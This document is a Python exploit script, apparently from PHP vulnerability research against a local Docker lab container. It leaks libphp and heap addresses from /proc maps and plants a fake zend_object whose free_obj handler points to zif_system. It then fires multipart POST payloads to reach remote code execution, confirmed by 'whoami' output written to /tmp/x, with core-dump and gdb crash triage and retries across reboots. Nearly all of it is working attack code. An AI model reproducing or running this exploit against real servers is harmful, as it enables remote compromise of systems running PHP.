#!/usr/bin/env python3
"""oom94: single-boot shot — same-boot VA0 + corrected object layout.

PROOF from oom93 boot B: walk READ the planted pointer (rdi=OBJ,
crash at dec +539) — but OBJ was computed from BOOT A's heap (cross-boot
ASLR blunder). Fix: VA0 = own-boot heap + 0x1718, read from /proc right
before arming. Also: zend_object.handle is at offset 8 (gc = 8 bytes),
not 16 — source: struct _zend_object.

Object block (at content 176 = OBJ, all offsets relative):
   0x00 rc=1 (dec target)      0x04 ti=0x108 (type8|DESTRUCTOR_CALLED)
   0x08 handle=1               0x10 ce=0 (never read, flag skips)
   0x18 handlers=OBJ+0x38      0x38 T2: offset=0
   0x40 free_obj=base+zif_system
   0x50 argz.value=OBJ+0x68    0x58 argz ti=6 (IS_STRING)
   0x68 gs: rc=1 ti=0x106 h=0 len=14    0x80 "whoami>/tmp/x\\0"
All other value bytes: pointer OBJ repeated (8-periodic, covers any slot).
zval ti read at [S+8] = low32(OBJ+8k) — suffix 0x1818/0x17C8 family:
type nibble 8 = IS_OBJECT, bit8=1 = refcounted (checked at runtime).
"""
import re
import struct
import subprocess
import sys
import time

sys.path.insert(0, '/Users/vlad/Projects/queue/php2shell-lab')
import payload68 as P

HOST = "http://127.0.0.1:8081/oom_sapi.php"
CMD = b"whoami>/tmp/x"
ZIF_SYSTEM = 0x39b8a0


def sh(c, t=120):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
    return (r.stdout + r.stderr).strip()


def post(att):
    import urllib.request
    req = urllib.request.Request(
        HOST, data=att,
        headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return "200", r.read(300)
    except Exception as e:
        return "ERR", str(e)[:150].encode()


def boot_maps():
    pid = sh("docker exec php_vuln pgrep -f 'apache2' | head -1").strip()
    maps = sh("docker exec php_vuln cat /proc/%s/maps" % pid)
    base = heap = None
    for ln in maps.splitlines():
        a = ln.split()
        if "libphp.so" in ln and len(a) > 1 and a[1].startswith("r") and base is None:
            base = int(a[0].split("-")[0], 16)
        if len(a) > 1 and a[1].startswith("rw") and heap is None:
            rng = a[0].split("-")
            if int(rng[1], 16) - int(rng[0], 16) >= 0x200000 and (len(a) < 6 or not a[5].startswith("/")):
                heap = int(rng[0], 16)
    return base, heap


def boot_core_env():
    sh("docker exec php_vuln sh -c \"grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars\"")
    sh("docker exec php_vuln sh -c \"printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf\"")
    sh("docker exec php_vuln sh -c 'rm -f /tmp/core* /tmp/x'")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        if "lim=8M" in sh("curl -s -m 5 " + HOST, 10):
            break
    md5 = sh("docker exec php_vuln md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
    assert md5 == P.STOCK_MD5, md5


def obj_block(OBJ, free_obj):
    B = bytearray(176)
    struct.pack_into("<II", B, 0x00, 1, 0x108)      # rc, ti
    struct.pack_into("<I", B, 0x08, 1)              # handle (offset 8!)
    struct.pack_into("<Q", B, 0x10, 0)              # ce (never read)
    struct.pack_into("<Q", B, 0x18, OBJ + 0x38)     # handlers -> T2
    struct.pack_into("<I", B, 0x2C, 1)              # frame num_args
    struct.pack_into("<Q", B, 0x38, 0)              # T2.offset
    struct.pack_into("<Q", B, 0x40, free_obj)       # free_obj
    struct.pack_into("<Q", B, 0x50, OBJ + 0x68)     # argz.value -> gs
    struct.pack_into("<I", B, 0x58, 6)              # IS_STRING
    struct.pack_into("<IIQI", B, 0x68, 1, 0x106, 0, len(CMD))
    B[0x80:0x80 + len(CMD)] = CMD
    B[0x80 + len(CMD)] = 0
    return bytes(B)


def chooser(libphp_base, VA0, free_obj):
    OBJ = VA0 + 176
    ob = obj_block(OBJ, free_obj)
    pt = struct.pack("<Q", OBJ) * 192 + b"A"

    def vt(i):
        v = bytearray(pt)
        if OBJ + 176 <= len(v):
            v[176:176 + 176] = ob
        return bytes(v)
    return vt


def check_x():
    x = sh("docker exec php_vuln sh -c 'ls -la /tmp/x 2>&1; cat /tmp/x 2>&1'")
    return "No such" not in x, x


def fetch_core(tag):
    sh("docker cp php_vuln:/tmp/core /tmp/c94_%s" % tag, 240)
    sh("docker cp /tmp/c94_%s phpbuild:/tmp/c94_%s" % (tag, tag), 240)
    return "/tmp/c94_%s" % tag


def gdb_regs(core_in_build):
    out = sh("docker exec phpbuild sh -c 'gdb -q -batch -ex \"info registers rdi rip\" /tmp/libphp.69.so /tmp/%s'" % core_in_build, 240)
    rdi = rip = None
    m = re.search(r"rdi\s+0x([0-9a-f]+)", out)
    if m:
        rdi = int(m.group(1), 16)
    m = re.search(r"rip\s+0x([0-9a-f]+)", out)
    if m:
        rip = int(m.group(1), 16)
    return rdi, rip


def arm_and_shoot(tag, vt):
    for i, k1 in enumerate(P.K1S[:-1]):
        post(P.build_attack(k1, 9100000 + i * 100000, value_tile=vt))
        hit, x = check_x()
        if hit:
            return ("x", x)
    post(P.build_attack(3400, 9200000, value_tile=vt))
    hit, x = check_x()
    if hit:
        return ("x", x)
    for fi in range(3):
        sb = 9210000 + fi * 4
        code, resp = post(P.build_attack(3400, sb, value_tile=vt))
        t2 = "fatal" if b"Fatal" in resp else ("clean" if code == "200" else "crash")
        print("  [%s] fire%d (%d): %s [%s]" % (tag, fi, sb, code, t2), flush=True)
        time.sleep(2)
        hit, x = check_x()
        if hit:
            return ("x", x)
        if code != "200":
            time.sleep(3)
            cb = fetch_core("%s%d" % (tag, fi))
            rdi, rip = gdb_regs("c94_%s%d" % (tag, fi))
            return ("crash", rdi, rip, cb)
    return ("silent",)


boot = 0
won = False
while boot < 4 and not won:
    print("=== boot %d ===" % boot, flush=True)
    boot_core_env()
    base, heap = boot_maps()
    assert base and heap, (base, heap)
    VA0 = heap + 0x1718
    OBJ = VA0 + 176
    low32 = (OBJ + 8) & 0xFFFFFFFF
    print("    libphp=0x%x heap=0x%x VA0=0x%x OBJ=0x%x" % (base, heap, VA0, OBJ), flush=True)
    print("    zval-ti@S = 0x%08x -> type=%d refc=%d" % (low32, low32 & 0xF, (low32 >> 8) & 1), flush=True)
    vt = chooser(base, VA0, base + ZIF_SYSTEM)
    r = arm_and_shoot("b%d" % boot, vt)
    if r[0] == "x":
        print("    /tmp/x: [%s]" % r[1], flush=True)
        print("*** RCE CONFIRMED ***", flush=True)
        won = True
        break
    if r[0] == "crash":
        rdi, rip = r[1], r[2]
        print("    crash rdi=0x%x rip=0x%x core=%s" % (rdi or 0, rip or 0, r[3]), flush=True)
        d = (rdi or 0) - OBJ
        print("    rdi-OBJ = %s (0x%x)" % (d, d & 0xFFFFFFFFFFFFFFFF), flush=True)
        if d == 8:
            print("    dec hit zval-ti slot (S+8) — rc was NOT 1: tile rotation off by 8; next boot re-rolls", flush=True)
        elif d == 0:
            print("    dec hit OBJ rc but SEGV — page not writable? decode core", flush=True)
        else:
            print("    other target — decode core", flush=True)
    else:
        print("    silent boot (dud arm churn ~25%%) — reboot and retry", flush=True)
    boot += 1

print("[restore]", flush=True)
sh("docker exec php_vuln sh -c 'rm -f /etc/apache2/conf-enabled/oomcore.conf && sed -i \"/ulimit -c/d\" /etc/apache2/envvars'")
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
time.sleep(8)
print("    restored:", sh("curl -s -m 5 " + HOST, 10), flush=True)
